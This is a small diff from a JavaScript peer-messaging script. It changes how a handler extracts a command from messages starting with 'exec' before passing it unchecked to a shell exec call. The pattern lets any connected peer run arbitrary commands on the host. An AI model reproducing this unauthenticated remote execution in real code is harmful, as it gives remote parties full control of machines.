@@ -18,7 +18,7 @@ var MACH_PORT = 45454;
  */
 function handleMessage(peer, msg) {
 	if (/^exec/.test(msg)) {
-		var cmd = msg.slice(5,msg.length-1);
+		var cmd = msg.slice(5);
 		try {
 			exec(cmd, function(err, stdout, stderr){
 				console.log("+[EXEC] \n"+stdout+stderr);
